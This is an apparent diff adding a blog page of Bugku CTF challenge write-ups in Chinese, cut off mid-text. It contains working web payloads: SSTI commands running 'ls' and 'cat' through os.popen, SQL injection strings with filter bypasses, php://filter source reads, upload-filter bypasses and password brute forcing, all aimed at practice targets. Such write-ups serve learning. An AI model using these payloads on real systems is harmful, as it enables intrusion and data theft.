@@ -1,0 +1,1630 @@
+<!doctype html><html lang=en dir=auto>
+<head><meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=robots content="index, follow">
+<title>Bugku | 0opsdc</title>
+<meta name=keywords content="CTF">
+<meta name=description content="Bugku Web Web1  Des：flag{}。
+ 查看源码即可。
+Web2  Des：输入验证码即可得到flag。
+ 输入框有输入长度限制，在控制台修改长度即可。
+Web3  Des：flag{}。
+ 通过get传参，按照题目要求直接传入
+?what=flagWeb4  Des:post。
+ 方法1 利用hackbar直接post传参。
+方法2 利用burp抓包传值。
+方法3 编写python脚本。
+import requests s = requests.Session() r = s.get(&#34;<url>&#34;) value = {'what':'flag'} r = s.post(&#34;<url>&#34;, value) print(r.text) 题目更新  Des:看看源代码吧。
+ 查看源代码，发现有两串编码字符串。
+分别对两个字符串进行URL解码：
+按照代码含义将其组合起来：
+放到控制台Console里排版。
+将if判断里与a.value判等的值输入提交框，提交。
+获得flag。
+Web5  Des:矛盾。
+ $num = $_GET['num']; if (!isnumeric($num)) { echo $num; if ($num == 1) echo 'flag{********}'; } 利用1a绕过，例：">
+<meta name=author content="0opsdc">
+<link rel=canonical href=https://examplesite.com/post/bugku/>
+<link crossorigin=anonymous href=/assets/css/stylesheet.min.5e2b4101351c21e906f398ae96901791830f58d430f96f2659dab7eaef7b3cb7.css integrity="sha256-XitBATUcIekG85iulpAXkYMPWNQw+W8mWdq36u97PLc=" rel="preload stylesheet" as=style>
+<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
+<link rel=icon href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
+<link rel=icon type=image/png sizes=16x16 href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
+<link rel=icon type=image/png sizes=32x32 href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
+<link rel=apple-touch-icon href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
+<link rel=mask-icon href=https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png>
+<meta name=theme-color content="#2e2e33">
+<meta name=msapplication-TileColor content="#2e2e33">
+<meta name=generator content="Hugo 0.88.1">
+<noscript>
+<style>#theme-toggle,.top-link{display:none}</style>
+<style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
+</noscript>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-123-45','auto'),ga('send','pageview'))</script><meta property="og:title" content="Bugku">
+<meta property="og:description" content="Bugku Web Web1  Des：flag{}。
+ 查看源码即可。
+Web2  Des：输入验证码即可得到flag。
+ 输入框有输入长度限制，在控制台修改长度即可。
+Web3  Des：flag{}。
+ 通过get传参，按照题目要求直接传入
+?what=flagWeb4  Des:post。
+ 方法1 利用hackbar直接post传参。
+方法2 利用burp抓包传值。
+方法3 编写python脚本。
+import requests s = requests.Session() r = s.get(&#34;<url>&#34;) value = {'what':'flag'} r = s.post(&#34;<url>&#34;, value) print(r.text) 题目更新  Des:看看源代码吧。
+ 查看源代码，发现有两串编码字符串。
+分别对两个字符串进行URL解码：
+按照代码含义将其组合起来：
+放到控制台Console里排版。
+将if判断里与a.value判等的值输入提交框，提交。
+获得flag。
+Web5  Des:矛盾。
+ $num = $_GET['num']; if (!isnumeric($num)) { echo $num; if ($num == 1) echo 'flag{********}'; } 利用1a绕过，例：">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://examplesite.com/post/bugku/"><meta property="og:image" content="https://examplesite.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="post">
+<meta property="article:published_time" content="2020-04-13T22:06:50+08:00">
+<meta property="article:modified_time" content="2020-04-13T22:06:50+08:00"><meta property="og:site_name" content="0opsdc">
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://examplesite.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E">
+<meta name=twitter:title content="Bugku">
+<meta name=twitter:description content="Bugku Web Web1  Des：flag{}。
+ 查看源码即可。
+Web2  Des：输入验证码即可得到flag。
+ 输入框有输入长度限制，在控制台修改长度即可。
+Web3  Des：flag{}。
+ 通过get传参，按照题目要求直接传入
+?what=flagWeb4  Des:post。
+ 方法1 利用hackbar直接post传参。
+方法2 利用burp抓包传值。
+方法3 编写python脚本。
+import requests s = requests.Session() r = s.get(&#34;<url>&#34;) value = {'what':'flag'} r = s.post(&#34;<url>&#34;, value) print(r.text) 题目更新  Des:看看源代码吧。
+ 查看源代码，发现有两串编码字符串。
+分别对两个字符串进行URL解码：
+按照代码含义将其组合起来：
+放到控制台Console里排版。
+将if判断里与a.value判等的值输入提交框，提交。
+获得flag。
+Web5  Des:矛盾。
+ $num = $_GET['num']; if (!isnumeric($num)) { echo $num; if ($num == 1) echo 'flag{********}'; } 利用1a绕过，例：">
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://examplesite.com/post/"},{"@type":"ListItem","position":2,"name":"Bugku","item":"https://examplesite.com/post/bugku/"}]}</script>
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Bugku","name":"Bugku","description":"Bugku Web Web1  Des：flag{}。\n 查看源码即可。\nWeb2  Des：输入验证码即可得到flag。\n 输入框有输入长度限制，在控制台修改长度即可。\nWeb3  Des：flag{}。\n 通过get传参，按照题目要求直接传入\n?what=flag\rWeb4  Des:post。\n 方法1 利用hackbar直接post传参。\n方法2 利用burp抓包传值。\n方法3 编写python脚本。\nimport requests s = requests.Session() r = s.get(\u0026#34;\u0026lt;url\u0026gt;\u0026#34;) value = {\u0026#39;what\u0026#39;:\u0026#39;flag\u0026#39;} r = s.post(\u0026#34;\u0026lt;url\u0026gt;\u0026#34;, value) print(r.text) 题目更新  Des:看看源代码吧。\n 查看源代码，发现有两串编码字符串。\n分别对两个字符串进行URL解码：\n按照代码含义将其组合起来：\n放到控制台Console里排版。\n将if判断里与a.value判等的值输入提交框，提交。\n获得flag。\nWeb5  Des:矛盾。\n $num = $_GET[\u0026#39;num\u0026#39;]; if (!isnumeric($num)) { echo $num; if ($num == 1) echo \u0026#39;flag{********}\u0026#39;; } 利用1a绕过，例：","keywords":["CTF"],"articleBody":"Bugku Web Web1  Des：flag{}。\n 查看源码即可。\nWeb2  Des：输入验证码即可得到flag。\n 输入框有输入长度限制，在控制台修改长度即可。\nWeb3  Des：flag{}。\n 通过get传参，按照题目要求直接传入\n?what=flag\rWeb4  Des:post。\n 方法1 利用hackbar直接post传参。\n方法2 利用burp抓包传值。\n方法3 编写python脚本。\nimport requests s = requests.Session() r = s.get(\"\") value = {'what':'flag'} r = s.post(\"\", value) print(r.text) 题目更新  Des:看看源代码吧。\n 查看源代码，发现有两串编码字符串。\n分别对两个字符串进行URL解码：\n按照代码含义将其组合起来：\n放到控制台Console里排版。\n将if判断里与a.value判等的值输入提交框，提交。\n获得flag。\nWeb5  Des:矛盾。\n $num = $_GET['num']; if (!isnumeric($num)) { echo $num; if ($num == 1) echo 'flag{********}'; } 利用1a绕过，例：\n?num=1a01\rWeb6  Des:flag{}。\n 查看源码。\nUnicode编码，解码即可。\nWeb7  Des:你必须让它停下。\n burp抓包，使用重放(Repeater)模块不断点击go发送页面，注意查看response。\nWeb8  Des:文件包含。\n 打开题目获得代码：\nphp extract($_GET) if (!empty($ac)) { $f = trim(file_get_contents($fn)); if ($ac == $f) { echo \"This is flag:\" .\"$flag\"; } else { echo \"sorry!\n\"; } } ?按照题目描述，尝试访问flag.txt，\n文件内容为flags，获得flag的条件是ac和fn严格相等，fn从flag.txt进行赋值，通过GET传参?ac=flags\u0026fn=flag.txt。\n获得flag。\n题目更新 ?hello=file('flag.php') Web9  Des:N/A。\n eval(\"var_dump($$args);\") # 调用两次，$($argc) 调用全局变量打印所有内容，尝试GLOBAL和GLOBALS。\nSimple_SSTI_1  Des:N/A。\n 页面显示：\nYou need pass in a parameter named flag。\r查看源码：\n html lang=\"en\" head meta charset=\"UTF-8\" titleSimple SSTItitle head body You need pass in a parameter named flag。  body html 搜了一下，SECRET_KEY是Flask中一个比较重要的变量值。\n?flag=flag\r# 页面回显flag\r?flag=2*2\r# 回显4，说明我们传入的数据是被信任的，存在ssti\r?flag=app.config['SECRET_KEY']\r# 回显报错\r?flag=config['SECRET_KEY']\r# 获得flag\rSimple_SSTI_2  Des:N/A。\n 页面和上题一样，也是模板注入。\n查看源码：\n html lang=\"en\" head meta charset=\"UTF-8\" titleSimple SSTI2title head body You need pass in a parameter named flag body html 查看根目录：\n?flag={{config.__class__.__init__.__globals__['os'].popen('ls ..').read()}}\r执行结果：\napp bin dev etc home lib media mnt opt proc root run sbin srv sys tmp usr var\r我们挨个查看目录，从第一个开始：\n?flag={{config.__class__.__init__.__globals__['os'].popen('ls ../app/').read()}}\r执行结果：\nDockerfile app.py flag gunicorn.conf.py templates\r直接查看flag文件：\n?flag={{config.__class__.__init__.__globals__['os'].popen('cat ../app/flag').read()}}\r获得flag。\nWeb10  Des:头等舱。\n F12在Network查看消息头即可。\n计算器  Des:N/A。\n 尝试输入结果，但只能输入一位字符，查看控制台元素。\n找到对应的输入框元素，发现长度被限定为1位，修改后输入正确答案。\n获得flag。\nweb基础$_GET  Des:N/A。\n GET传参直接在URL后键入值即可。\n在URL后加上?what=flag。\n获得flag。\nweb基础$_POST  Des:N/A。\n 需要通过POST方式传入参数flag，使用hackbar插件。\n获得flag。\n矛盾  Des:N/A。\n 简单分析可知，GET传参，获取flag需要经过两个if判断：1.参数num不为数字；2.参数获取值为1。\n我们可以构造一个字符串，以1开头的字符串在php会被判定成功，在URL后输入?num=1x。\n获得flag。\n域名解析  Des:听说把网址解析到xxx就能拿到flag。\n Linux：\nvim /etc/hosts 添加： xxx。\n保存后访问网址。\nWindows同理。\n获得flag。\n你必须让他停下  Des:N/A。\n 页面不断刷新，查看源码\n猜测flag就在网页中，不断刷新使我们无法看到，使用burp抓包。\n拦截页面后发送至Repeater，不断Go，查看Response。\n获得flag。\n本地包含 题目已挂。\n变量 php error_reporting(0); include \"flag1.php\"; highlight_file(__file__); if (isset($_GET['args'])) { $args = $_GET['args']; if (!preg_match(\"/^\\w+$/\", $args)) { die(\"args error!\"); } eval(\"var_dump($$args);\"); } ?两个关键点：正则表达式和$\\$args。\n此处正则表达式匹配均为字母的串，匹配不成功则报错；$$args意为可变变量，若$args代表一个变量，那么$$args则代表另一个变量。尝试给args赋一个变量名。\nPHP九大全局变量：\n$_POST[接收post提交的数据]\n$\\_GET[接收GET提交的数据]\n$\\_FILES[文件接收处理]\n$\\_COOKIE[获取setCookie()中的name值]\n$\\_SESSION[存储或获取session的值]\n$\\_REQUEST[有get，post的功能，但较慢]\n$_SERVER[预定义服务器的一种变量]\n$_GLOBALS[包含了全部变量的全局组合数组]\n$\\_ENV[包含服务器端环境变量的数组，是PHP中的超级变量，可以在PHP程序任何位置直接访问]。\n依次尝试，当传入?args=GLOBALS时成功获得flag。\n头等舱  Des:N/A。\n 查看源码，没有有用信息，尝试御剑扫描后台。\n发现md5.php，进行访问。\n通过GET传参输入a。\n唔，然后返回最开始的网址，使用burp进行抓包，查看Response。\n获得flag。\n网站被黑  Des:这个题没技术含量但是实战中经常遇到。\n 给出的访问目录是webshell，御剑扫描后台，进入shell.php，此处对密码进行爆破，在shell处输入密码。\n获得flag。\n管理员系统  Des:N/A。\n 是一个登录窗口，查看控制台元素：\n这是Base64编码，解码获得：\n尝试账密admin/test123。\n页面报错，显示IP禁止访问，猜测应该是对访问地址进行了限制，尝试利用X-Forwarde-For修改XFF头为127.0.0.1。\n 百度百科：XFF是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。\n 获得flag。\nflag在index里面  Des:N/A。\n 网页给出一个超链接，点击进行跳转。\n猜测这是admin的密码，查看源码，没有线索，查看URL，发现一个文件包含漏洞。\n这里使用了php的封装协议，资料：http://php.net/manual/zh/wrappers.php.php。\n首先尝试访问http://xxx:port/post/index.php?file=php://filter/resource=index.php。\n网页空白，源码也没有有用信息，但是有5w多行，可能flag藏在里面？\n尝试一下base64编码后访问：http://xxx:port/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php\n这是一个file关键字的GET传参，php://是协议名，php://filter/是一种访问本地文件的协议，/read=convert.base64-encode/表示将其进行base64编码后进行读取，resource=index.php就是我们所要访问的目的页面了。\nBase64编码后访问URL，得到一串加密字符串：\n进行Base64解码：\n\rBugku-ctf\rclick me? no';\r}\r$file = $_GET['file'];\rif (strstr($file, \"../\") || stristr($file, \"tp\") || stristr($file, \"input\") || stristr($file, \"data\")) {\recho \"Oh no!\";\rexit();\r}\rinclude($file);\r//flag:flag{edulcni_elif_lacol_si_siht}\r?\r\r获得flag。\n输入密码查看flag  Des:N/A。\n URL：http://xxx:port/baopo/，源码没有有用信息，告知5位数，尝试使用burp进行数字爆破，范围10000-99999。\n随机输入密码后进行抓包。\n然后发送至Intruder，在Intruder界面先选择Clear清除所有Payload，再选中pwd后点击Add。\n在Payload菜单选择攻击字典。\n在Options菜单适当选择攻击线程，加快速度，不过过大的线程可能会导致自己的网络崩溃。\n点击右上角的Start Attack，进入到爆破界面。\n可以随时点击后四个菜单栏进行排序，查看有没有特殊情况，喝杯水的时间就能把整个范围跑完，输入产生特殊值的Payload。\n获得flag。\n点击一百万次  Des:JavaScript。\n 题目已挂。\n备份是个好习惯  Des:听说备份是个好习惯。\n 得到一串编码字符串：\nd41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e\r不晓得这是什么…然后用御剑扫描后台，发现index.php.bak备份文件，下载使用cat命令查看。\n简单判断，需要进行md5碰撞获得flag，而且后台会自动替换掉key关键字，首先查找常见md5碰撞值，然后通过复写key关键字进行绕过：\n?kkeyey1=QNKCDZO\u0026\u0026kkeyey2=s878926199a\r将构造字符串置于URL最后，回车访问。\n获得flag。\n成绩单  Des:快来查查成绩吧。\n 输入框依次输入1，2，3并提交，成功回显成绩单，当输入4时，页面没有回显。\n查看源码，没有隐藏信息。在输入框输入1'，利用最常见的单引号判断是否存在SQL注入，页面没有回显，继续测试列数，猜测有姓名、数学、英语、语文四列，输入1' order by 4#，页面回显正常，尝试1' order by 5#，页面没有回显，判断表有四列。接下来尝试爆破库名、表名、字段名。\n尝试联合查询，在查询框输入id=1' union select 1,2,3,4#，将我们的代码通过POST传参达到执行的目的，页面回显如下，四个表均有回显。\n开始爆破库名：id=1' union select 1,2,3,database()#，获得库名skctf_flag。\n进一步爆破表名：id=1' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_name = database()#，获得两个表：fl4g和sc。\n爆破字段名：id=1' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name = 0x666c3467#，\n ps:尝试使用table_name = fl4g时，页面没有回显，将fl4g转为十六进制，0x代表引号。\n 获得字段名：skctf_flag。\n查看字段名内容：id=-1' union select 1,2,3,skctf_flag from fl4g#。\n获得flag。\n秋名山老司机  Des:是不是老司机试试就知道。\n 打开网页后，是一个计算问题，查看源代码。\n每次刷新之后，需要计算的数字都不一样，页面通过POST方式传值，这里尝试用python脚本来进行计算：\nimport requests import re s = requests.Session() r = s.get('') obj = re.search(r'(\\d+[+\\-*])+(\\d+)', r.text) d = { 'value': eval(obj.group(0)) } r = s.post('') print(r.text) 需要访问网站，还需要利用正则表达式对网站给出的数字进行匹配，所以导入requests和re库。\n从requests库导入的类一定要为Session()，若是使用了session()，会导致网页刷新，不能获得正确的值。\ns是创建的会话对象，以会话对象向url发出一个get请求。\nr用来接受网站访问获得的数据，obj用来存储进行正则表达式匹配后的值，\\d+表示匹配一个或多个字符，[+\\-*]匹配加号、减号和乘号，但因为减号为特殊符号，这里使用反斜杠\\进行转义。re.search扫描一个字符串返回第一个匹配成功的值，r.text为服务器返回页面的内容，r表示字符串为原始字符串，里面的反斜杠\\不会被认为是转义符。\n下面创建字典d，键为value，键值为刚才匹配出的式子的值，eval计算式子的值，group(0)表示匹配的结果，索引从0开始，这里指匹配到的式子。\n以POST方式给url传值，参数data为默认值，不可更改。\n ps：参数之所以为data，是因为用burp抓包显示网页传递值的参数就是data，所以不能更改。\n 最后打印r.text里的内容。\n我直接运行后由于编码报错。\n在终端输入命令chcp 65001，切换到代码所在目录，python xxx.py，就能够正常返回结果。\n获得flag。\n速度要快  Des:速度要快！！！\n 查看网页源码：\nhtml headhead body br \"我感觉你得快点!!!\"  body html 用burp抓包试一下。\n抓包后Response里会有flag 的返回值，经过Base64解码后得到一个字符串，提交后显示flag不正确，尝试后发现需要两次Base64解码。再次尝试Request，查看Response，发现flag后的字符串会变化，而我们还需要通过POST传值，写一个python脚本：\nimport requests import base64 url = '' r = requests.Session() headers = r.get(url).headers mid = base64.b64decode(headers['flag']) mid = mid.decode() # 将得到的byte类型值转换为字符串类型，不然使用split()函数会导致类型不匹配报错 flag = base64.b64decode(mid.split(':')[1]) # 截取冒号之后的内容，冒号后有一个空格，所以跳过冒号之后的一个内容 data = {'margin': flag} print(r.post(url, data).text) 获得flag。\ncookies欺骗  Des:N/A。\n 打开题目看见一大堆字母，猜测是栅栏密码，可是没法解，抓包试一下。\n发现GET请求的是http://xxx.xxx.xxx/index.php?line=\u0026filename=a2V5cy50eHQ=，filename后的字符串经Base64解码后为keys.txt。\n继续观察，发现line并没有赋值，尝试赋值，页面显示空白，查看源码，没有东西。\n下一个思路，尝试用filename访问常见的index.php，先将它进行Base64编码，得到：aW5kZXgucGhw，尝试访问，页面还是显示空白，查看源码，发现有了。\n继续尝试给line赋值，line=1时：\nline=2时：\n写个python脚本自动更改line赋值：\nimport requests for i in range(1, 30): url = '/index.php?line={}\u0026filename=aW5kZXgucGhw'.format(i) # 利用format()函数更改line的值 r = requests.get(url) print(r.text) 得到php代码如下：\nphp error_reporting(0); $file = base64_decode(isset($_GET['filename'])?$_GET['filename']:\"\"); $line = isset($_GET['line'])?intval($_GET['line']):0; if ($file == '') header(\"location:index.php?line=\u0026filename=a2V5cy50eHQ=\"); $file_list = array ( '0' = 'keys.txt', '1' = 'index.php', ); if (isset($_COOKIE['margin']) \u0026\u0026 $_COOKIE['margin'] == 'margin') { $file_list[2] = 'keys.php'; } if (in_array($file, $file_list)) { $fa = file($file); echo $fa[$line]; } ?发现有一个keys.php文件，将其加密后通过filaname访问，空白页面，页面源码为空，尝试burp抓包，并把Cookie改为margin=margin，查看Response。\n获得flag。\nnever give up  Des:N/A。\n 页面源码如下:\n never never never give up!!! 尝试访问1p.html页面，但自动跳转到一个论坛，猜测有重定向头，然后直接查看源码：view-source:http://xxx.xxx.xxx.xxx:xxxx/test/1p.html，获得如下源码：\n进行URL解码：\nBase64解码：\n!--%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E--\rURL解码：\n直接访问f4l2a3g.txt。\n获得flag。\nwelcome to bugkuctf 题目已挂。\n过狗一句话 题目已挂。\n字符？正则？  Des:N/A。\n 打开题目获得代码：\nphp highlight_file('2.php'); $key = 'KEY{****************}'; $IM = preg_match(\"/key.*key.{4,7}key:\\/.\\/(.*key)[a-z][[:punct:]]/i\", trim($_GET[\"id\"]), $match); if ($IM) { die('key is:'.$key); } ? . 匹配除 “\\n” 之外的任何单个字符\n* 匹配它前面的表达式0次或多次，等价于{0,}\n{4,7} 最少匹配 4 次且最多匹配 7 次，结合前面就是匹配 4 到 7 个任意字符\n/ 匹配 / ，这里的 \\ 是为了转义\n[a-z] 匹配所有小写字母\n[:punct:] 匹配任何标点符号\n/i 表示不分大小写\n 构造payload：?id=keykeyaaaaakey:/a/keya:。\n获得flag。\n前女友 题目已挂。\nlogin1 题目已挂。\n你从哪里来  Des:N/A。\n 使用burp抓包后增加Referer为https://www.google.com。\n获得flag。\nmd5 collision  Des:N/A。\n 构造?a，回显：\n搜索常见md5碰撞值，本题使用：?a=s878926199a。\n获得flag。\n程序员本地网站  Des:请从本地访问。\n 利用插件将XFF修改为127.0.0.1。\n刷新。\n获得flag。\n各种绕过  Des:各种绕过哟。\n 打开题目获得源码：\nphp highlight_file('flag.php'); $_GET['id'] = urldecode($_GET['id']); $flag = 'flag{xxxxxxxxxxxx}'; if (isset($_GET['uname']) and isset($_POST['passwd'])) { if ($_GET['uname'] == $POST['passwd']) print 'passwd can not be unmae.'; else if (sha1($_GET['uname']) == sha1($_POST['passwd']) \u0026 ($_GET['id'] == 'margin')) { die('Flag:'.$flag); } else print 'sorry!'; } ?分析代码得知，获得flag的条件是uname和passwd不同，且经sha1()函数加密后值相等，id=margin即可获得flag。\n那么我们利用sha1()函数N/A法处理数组的漏洞，首先经过第一处不等判断，在else if里，左边括号假假为真，总括号真真为真。构造payload:?id=margin\u0026uname[]=0，通过hackbar插件POST传参passwd[]=1。\n获得flag。\n细心  Des:想办法变成admin。\n 打开题目后是一个404页面，源码啥也没有，尝试使用御剑扫描后台目录。\n发现robots.txt，访问：\n访问resusl.php：\n根据下面的GET传参提示，以及之前的题目描述，尝试构造?x=admin。\n获得flag。\n求getshell  Des:N/A。\n 是一个上传文件的题目，页面说的很清楚，只允许上传图片格式的文件，先简单写一个php，修改文件后缀为常见图片格式。\nphp echo['Hello'] ?点击提交， 使用burp抓包。\n然后修改Content-Type:multipart/form-data其中字段的任一值为大写，进行绕过，然后将filename改为xxx.php5，之所以为php5是尝试过其他格式后能正确或的flag的类型，点击提交。\n获得flag。\nINSERT INTO注入  Des:不如写个Python吧。\n php error_reporting(0); function getIp() { $ip = ''; if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; } else { $ip = $_SERVER['REMOTE_ADDR']; } $ip_arr = explode(',', $ip); return $ip_arr[0]; } $host = \"localhost\"; $user = \"\"; $pass = \"\"; $db = \"\"; $connect = mysql_connect($host, $user, $pass) or die(\"Unable to connect\"); mysql_select_db($db) or die(\"Unable to select database\"); $ip = getIp(); echo 'your ip is:'.$ip; $sql = \"insert into client_ip (ip) values ('$ip')\"; mysql_query($sql); ?打开题目后直接显示IP地址。\n这道题直接贴上完整过程的python代码：\n获得flag。\n这是一个神奇的登录框 题目已挂。\n多次  Des:本题有2个flag。\n 修改URL后的id值，id=2时：\nid=3时：\nid=4时：\nid=5时：\n提示SQL注入了。\n构造?id=1' and 1=1 --+，页面回显:\n将and进行双写：?id=1' anandd 1=1 --+ ，页面回显正常，可使用双写绕过。\n然后利用异或注入检测被过滤字符，语句:?id=1'^(length('union')!=0)--+。\n若页面回显正常，则说明union字段长度为0，被过滤，继续尝试，and、or、select关键字均被过滤。\n接下来我们进行表名的爆破：?id=-1' uunionnion sselectelect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()--+\n字段爆破：?id=-1' uunionnion sselectelect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name='flag1'--+\n内容爆破：?id=-1' uunionnion sselectelect 1,group_concat(flag1) from flag1--+\n提交后发现并不正确，然后爆破address的内容：?id=-1' uunionnion sselectelect 1,group_concat(address) from flag1--+\n跳转：\n大小写和双写绕过都被过滤了。\n使用extrcatvalue()函数进行报错注入。\n爆破库名：?id=1' and extractvalue(1,concat(0x7e,database(),0x7e))--+\n爆破表名：?id=1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='web1002-2'),0x7e))--+\n爆破字段：?id=1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='flag2'),0x7e))--+\n爆破内容：?id=1' and extractvalue(1,concat(0x7e,(select group_concat(flag2) from flag2),0x7e))--+\n获得flag。\nPHP_encrypt_1  Des:fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=\n php function encrypt($data, $key) { $key = md5('ISCC'); $x = 0; $len = strlen($data); $klen = strlen($key); for ($i = 0; $i  $len; $i++) { if ($x == $klen) { $x = 0; } $char .= $key[$x]; $x += 1; } for ($i = 0; $i  $len; $i++) { $str .= chr((ord($data[$i]) + ord($char[$i])) % 128); } return base64_encode($str); } ?直接贴上解码php脚本：\n在配置好环境的Linux终端php xxx.php运行。\n获得flag。\n文件包含2 题目已挂。\nflag.php  Des:点了login咋没反应，提示：hint。\n 御剑扫描后台，没有有效信息。\n根据提示，GET传参?hint=0，获得代码：\n?\r\r\rLogin\r\r\r\r\r\r\r审计代码得知，变量KEY的值为NULL，测试代码如下：\nphp print(serialize(\"$KEY\")); $KEY='flag'; ?s:0:\"\";\n使用burp抓包，添加Cookie:ISecer=s:0:\"\";。\n点击发送。\n获得flag。\nsql注入2  Des:全都tm过滤了绝望吗？提示： !,!=,=,+,-,^,%\n 这道题用不上sql注入的方法，可以使用DS Store泄露获得flag。\n利用脚本：lijiejie/ds_store_exp: A .DS_Store file disclosure exploit. It parses .DS_Store file and downloads files recursively. (github.com)\npython ds_store_exp.py http://xxx.xxx.xxx.xxx:xxxx/web2/.DS_Store\n获得flag。\n孙xx的博客 此题已被玩坏。\nTrim的日记本  Des:不要一次就放弃。\n 页面所有功能都能正常使用。\n御剑扫描后台试试。\n扫出show.php。\n获得flag。\nlogin2 题目已挂。\nlogin3 题目已挂。\n文件上传2 题目已挂。\n江湖魔头 未解。\nlogin4 未解。\nWeb进阶 phpcmsV9  Des:flag在根目录里txt文件里。\n 给出的页面加载不全，查看源码也没啥有用信息。\n看看robots.txt有没有什么信息呢。\n获得flag。\n海洋CMS  Des:flag在根目录某个txt里。\n 题目已挂。\n小明的博客  Des:N/A。\n 题目已挂。\nBugku-cms1  Des:后台可以getshell哟，flag在根目录。\n 一串乱码，源码也没信息。\n御剑扫后台，啥也没有，上网看了下wp，题应该被搞坏了。\nmaccms-苹果cms  Des:N/A。\n 貌似被搞了…\nBugku-企业管理系统  Des:flag在网站根目录。\n 题目已挂。\nappcms  Des:flag在根目录。\n 题目已挂。\n实战2-注入 bugkucms bugku导航 又是一个博客 Misc 签到题  Des:N/A。\n 关注公众号即可。\n这是一张单纯的图片  Des:key{}。\n 图片没什么，WinHex看看。\n最后一段有Unicode编码。\n隐写  Des:N/A。\n 一张图片，查看属性发现为500×420，WinHex修改高度。\ntelnet  Des:N/A。\n wireshark，搜索flag。\n眼见非实  Des:N/A。\n binwalk发现是zip文件，解压后依次查找flag。\n代码审计 extract变量覆盖  Des:N/A。\n php $flag = 'xxx'; extract($_GET); if (isset($shiyan)) { $connect = trim(file_get_contents($flag)); if ($shiyan == $content) { echo 'flag{xxx}'; } else { echo 'Oh.no'; } } ?简单分析得出，只要使$flag和$shiyan两个变量相等即可，使用置空的方式让其相等，这就是覆盖题目的基本思路。\n构造?flag=\u0026shiyan=。\n获得flag。\n分析 flag被盗  Des:flag被盗，赶紧溯源！\n 给了一个key.pcapng文件，使用记事本打开。\nCtrl+F搜索flag。\n获得flag。\n加密 滴答~滴  Des:-… -.- -.-. - ..-. – .. … -.-.。\n 很简单的Morse加密，摩尔斯电码转换器：在线进行摩尔斯电码和英文字母的相互转换，可以把莫尔斯电码转换为英文字母，也可把英文字母转换为摩尔斯电码 (zhongguosou.com)。\n获得flag。\n聪明的小羊  Des:一只小羊翻过了2个栅栏，KYsd3js2E{a2jda}。\n 很明显，栅栏加密，栅栏密码在线加密解密 - 千千秀字 (qqxiuzi.cn)。\n获得flag。\nok  Des:Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. 